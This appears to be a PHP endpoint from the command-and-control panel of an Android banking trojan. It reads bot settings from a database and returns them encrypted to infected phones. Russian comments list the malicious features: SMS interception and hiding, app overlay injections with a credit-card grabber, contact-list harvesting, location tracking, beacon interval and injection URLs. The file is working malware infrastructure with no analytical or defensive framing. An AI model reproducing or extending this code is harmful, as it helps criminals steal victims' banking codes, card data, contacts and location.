<?php
include 'crypt.php';
include 'config.php';
$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM settingsall WHERE id='1'";

$hash="";
$urls="";
$urlInj="";
$intInterval=0;
$checksms=0;
$checkhidesms=0;
$checkgeolocation=0;
$checkInjectionsApps=0;
$secondInjectionsApps=0;
$checkRequestGeolocation=0;
$secondRequestGeolocation=0;
$checkGrab_auto=0;
$Grab_auto="";
$secondGrab_auto=0;
$checkInjGrab=0;
$InjGrab="";
$secondInjGrab=0;
$checkPhoneContacts=0;
$secondPhoneContacts=0;
$checkStartGeolocation=0;
$secondStartGeolocation=0;
$findfiles="";

foreach($connection->query($sql) as $row)
{
	$hash = $row['hash'];
	$urls=$row['urls'];
	$urlInj=$row['urlInj'];
	$intInterval = $row['intInterval'];
	$checksms = $row['checksms'];
	$checkhidesms = $row['checkhidesms'];
	$checkgeolocation = $row['checkgeolocation'];
	$checkInjectionsApps = $row['checkInjectionsApps'];
	$secondInjectionsApps = $row['secondInjectionsApps'];
	$checkRequestGeolocation = $row['checkRequestGeolocation'];
	$secondRequestGeolocation = $row['secondRequestGeolocation'];
	$checkGrab_auto = $row['checkGrab_auto'];
	$Grab_auto = $row['Grab_auto'];
	$secondGrab_auto = $row['secondGrab_auto'];
	$checkInjGrab = $row['checkInjGrab'];
	$InjGrab = $row['InjGrab'];
	$secondInjGrab = $row['secondInjGrab'];
	$checkPhoneContacts = $row['checkPhoneContacts'];
	$secondPhoneContacts = $row['secondPhoneContacts'];
	$checkStartGeolocation = $row['checkStartGeolocation'];
	$secondStartGeolocation = $row['secondStartGeolocation'];
	$findfiles=$row['findfiles'];
	break;
}

if($checksms == "1")$checksms = "true"; else $checksms = "false";
if($checkhidesms == "1")$checkhidesms = "true"; else $checkhidesms = "false";
if($checkgeolocation == "1")$checkgeolocation = "true"; else $checkgeolocation = "false";
if($checkInjectionsApps != "1") $secondInjectionsApps = -1;
if($checkRequestGeolocation != "1") $secondRequestGeolocation = -1;
if($checkGrab_auto != "1") $secondGrab_auto = -1;
if($checkInjGrab != "1") $secondInjGrab = -1;
if($checkPhoneContacts != "1")  $secondPhoneContacts = -1;
if($checkStartGeolocation != "1") $secondStartGeolocation = -1;

	/*
	0) Hash(String)
	1) Интервал отстука(int)
	2) Перехват смс(Check - int)
	3) Скрывать перехваченые смс(Check - int)
	4) Запуск геолокации(Check - int)
	5) Запрос для разрешения инжектирования приложений(int)
	6) Запуск запроса разрешения геолокации(Check - i(int)
	7) Включаем автоинжекты и выбираем граббер СС(String/int)
	8) Включаем инжекты и выбираем граббер СС(String/int)
	9) Сбор лист контактов(int)
	10) Запуск геолокации(int)
	11) Urls panel (String)
	12) Url Injections (String)
	*/

	$otv = encrypt("$hash~$intInterval~$checksms~$checkhidesms~$checkgeolocation~$secondInjectionsApps~$secondRequestGeolocation~$Grab_auto/$secondGrab_auto~$InjGrab/$secondInjGrab~$secondPhoneContacts~$secondStartGeolocation~$urls~$urlInj~$findfiles~",cryptKey);

	echo "<tag>$otv</tag>";
?>
